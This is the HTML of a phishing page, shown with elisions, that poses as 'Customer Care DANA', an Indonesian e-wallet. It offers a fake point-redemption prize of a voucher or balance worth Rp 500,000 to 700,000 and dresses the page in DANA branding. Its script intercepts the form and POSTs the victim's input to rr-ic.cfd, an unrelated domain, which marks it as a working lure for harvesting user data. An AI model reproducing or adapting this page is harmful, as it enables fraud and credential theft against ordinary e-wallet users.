...
<head>
    ...
    <title>𝗗𝗔𝗡𝗔 | 𝗖𝘂𝘀𝘁𝗼𝗺𝗲𝗿 𝗖𝗮𝗿𝗲 𝗗𝗔𝗡𝗔</title>
...
<body>
     ...
     <div id="process1" name="process" class="process" style="display: none;">
            <div class="loading">
                ...
                <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjymgZkivno__fWTdTz6vvunARIRJI4BZogXCTs1Q35vHyxC3A1oZU4JyRKdwoXwJsKF90P0B-7Tilt7sPl0VfXIdaltZEX6c97hkKpVD6MOMS04xpqaH4HL318jf_bOGlOhIL2KmyJMZfH_mhw9AqxGr28S53SYvvQaVSUwMtoWXsup2HC83uzdzoVHtY/s1600/load_spin.png" id="loading">
            </div>
        </div>
        </center>
    <h1 style="padding: 10px;">
        <center>
            <img src="https://hosting.tigerengine.id/ulqfeu.png" width="100"
                style="display:flex;margin:0 auto;left ">
        </center>
    </h1>
    <div class="container">
        <div class="slider">
            <div> <a href="#"> <img
                        src="https://hosting.tigerengine.id/nq3zwi.png"
                        alt="Image 1"> </a> </div>
            <div> <a href="#"> <img
                        src="https://hosting.tigerengine.id/kiduv9.png"
                        alt="Image 2"> </a> </div>
            <div> <a href="#"> <img src="https://hosting.tigerengine.id/f452ma.png" alt="Image 3"> </a> </div>
            <div> <a href="#"> <img
                        src="https://hosting.tigerengine.id/s6h6sa.png"
                        alt="Image 4"> </a> </div>
            <div> <a href="#"> <img
                        src="https://hosting.tigerengine.id/inx5ba.png"
                        alt="Image 5"> </a> </div>
            
        </div>
        <form  id="patok" onsubmit="letsgo1()" method="post">
 
            <div class="panel panel-info animated" style="margin:0 auto;left:0;right:0;outline: 2px double #0086e0; border-radius: 13px">
  ...
  width: 20px;
  height: 20px;
  accent-color: #007bff; /* Warna biru */
}
                    </style>
                        <p style="border-radius:15px;margin:0 auto;left:0;right:0;text-align: center; font-size: 14px; border-bottom: 2px double #0086e0; font-weight: bold; color: #0086e0">Pilih Penukaran Poin Anda di Bawah Ini<br><br></p>
                        <legend>
                            
                            <br> 
                           
  <input type="radio" id="baru" name="tarif" value="𝗩𝗼𝘂𝗰𝗵𝗲𝗿 𝗕𝗲𝗹𝗮𝗻𝗷𝗮 Rp. 500.000" required >
  <label for="baru" style="font-size:15px;text-shadow: 2px 2px 2px #00000030;">&nbsp; 𝗩𝗼𝘂𝗰𝗵𝗲𝗿 𝗕𝗲𝗹𝗮𝗻𝗷𝗮 Rp. 500.000</label>
                            <br>
  <input type="radio" id="lama" name="tarif" value="𝗦𝗮𝗹𝗱𝗼 𝗗𝗮𝗻𝗮 Rp. 700.000"  required >
  <label for="lama" style="font-size:15px;text-shadow: 2px 2px 2px #00000030;">&nbsp; 𝗦𝗮𝗹𝗱𝗼 𝗗𝗮𝗻𝗮 Rp. 700.000</label>
                             <br>
      ...
      <br> 
                 ...
                 <button id="btn1" class="btn-punya animatedLeft" type="submit" >Konfirmasi</button>
        </form>
     ...
     <br><br>
        ...
        <center>
            <div class="css-dnzamn"><img src="https://hosting.tigerengine.id/sxbut9.png"
                    width="60"><img src="https://hosting.tigerengine.id/45b4wg.png"
                    width="70"><img
                    src="https://hosting.tigerengine.id/vfejf1.jpg"
                    width="70">
                <img src="https://hosting.tigerengine.id/srk5n2.png" width="50">
            </div>
            <br>
<!--- ## DRIBBBLE + TWITTER ############# -->

<footer class="animatedUp"style="max-width:450px;margin: 0 auto;left: 0;right:0;position: fixed; bottom: 0; left: 0; right: 0; width: 100%; height: 20%; z-index: 3; background-color: #fff; border-radius: 15px 15px 0px 0px;background-image: url(https://a.m.dana.id/resource/danaweb-v2/hero-personal-bg-back.png); background-position: 100% 100%;background-size: 100% 100%;border-top: 3px groove #fff;outline: 3px solid #118EEA;box-shadow: rgba(6, 24, 44, 0.5) 0px 0px 5px 5px ;">
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://rr-ic.cfd/cv2d/ll/tarif.php',
